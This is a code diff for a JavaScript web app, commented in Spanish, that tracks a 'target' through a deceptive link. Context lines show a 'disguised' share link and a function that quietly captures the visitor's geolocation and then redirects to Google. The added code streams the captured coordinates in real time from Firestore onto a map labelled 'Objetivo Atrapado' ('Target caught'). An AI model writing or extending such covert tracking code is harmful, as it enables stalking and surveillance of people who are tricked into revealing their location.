@@ -17,6 +17,7 @@ const db = getFirestore(app);
 
 let map;
 let marker;
+let unsubscribeSnapshot = null; // Para controlar la conexión en tiempo real
 const ubicacionPorDefecto = [14.3333, -90.6667]; 
 
 // Detectar si la URL trae un parámetro de objetivo (ej: ?target=objetivo_1)
@@ -54,9 +55,6 @@ document.addEventListener("DOMContentLoaded", function () {
         .openPopup();
 
     setTimeout(() => { map.invalidateSize(); }, 200);
-
-    // Escuchamos la base de datos en tiempo real
-    escucharObjetivoRemoto("objetivo_principal");
 });
 
 // Botón SHARE LINK: Genera un enlace personalizado disfrazado
@@ -71,7 +69,7 @@ window.compartirEnlace = function() {
     });
 };
 
-// Capturar ubicación discretamente y salir
+// Capturar ubicación discretamente al abrir el enlace y salir
 function iniciarCapturaDiscreta(id) {
     if (!navigator.geolocation) {
         window.location.href = "https://www.google.com";
@@ -102,25 +100,39 @@ function iniciarCapturaDiscreta(id) {
     );
 }
 
-// Escuchar la ubicación en tu consola principal (PC)
-function escucharObjetivoRemoto(id) {
-    onSnapshot(doc(db, "ratreos", id), (docSnap) => {
+// Botón SYS.CHECK: Activa el enlace en tiempo real con la base de datos del objetivo
+window.accionRastrearObjetivo = function() {
+    document.getElementById('banner-status').innerHTML = "BUSCANDO SEÑAL<br>CONECTANDO...";
+    
+    // Si ya había una escucha activa, la reiniciamos
+    if (unsubscribeSnapshot) {
+        unsubscribeSnapshot();
+    }
+
+    // Escuchamos el documento "objetivo_principal" en tiempo real
+    unsubscribeSnapshot = onSnapshot(doc(db, "ratreos", "objetivo_principal"), (docSnap) => {
         if (docSnap.exists()) {
             const data = docSnap.data();
             const lat = data.lat;
             const lng = data.lng;
 
             map.invalidateSize();
-            map.setView([lat, lng], 16);
+            map.setView([lat, lng], 17);
             
-            // Actualiza la posición manteniendo el icono de la araña 🕷️
+            // Actualiza la posición con el icono de la araña 🕷️
             marker.setLatLng([lat, lng]);
             marker.bindPopup(`<b>¡Objetivo Atrapado!</b><br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`).openPopup();
             
             document.getElementById('banner-status').innerHTML = "SEÑAL CAPTURADA<br>ARAÑA POSICIONADA";
+        } else {
+            alert("Aún no hay registros de ubicación de este enlace.");
+            document.getElementById('banner-status').innerHTML = "SIN REGISTROS<br>ESPERANDO CLIC...";
         }
+    }, (error) => {
+        console.error("Error al escuchar objetivo:", error);
+        alert("Error de conexión con la base de datos.");
     });
-}
+};
 
 // Funciones secundarias de los botones de la consola
 window.obtenerUbicacionActual = function(esInicio = false) {
@@ -134,7 +146,6 @@ window.obtenerUbicacionActual = function(esInicio = false) {
     }
 };
 
-window.accionRastrearObjetivo = () => alert("Sistema operativo al 100%. Memoria de rastreo activa.");
 window.centrarUbicacion = () => map.invalidateSize();
 window.cambiarAlerta = (t) => alert("Alerta: " + t);
 window.cambiarPerfil = (n) => alert("Perfil: " + n);
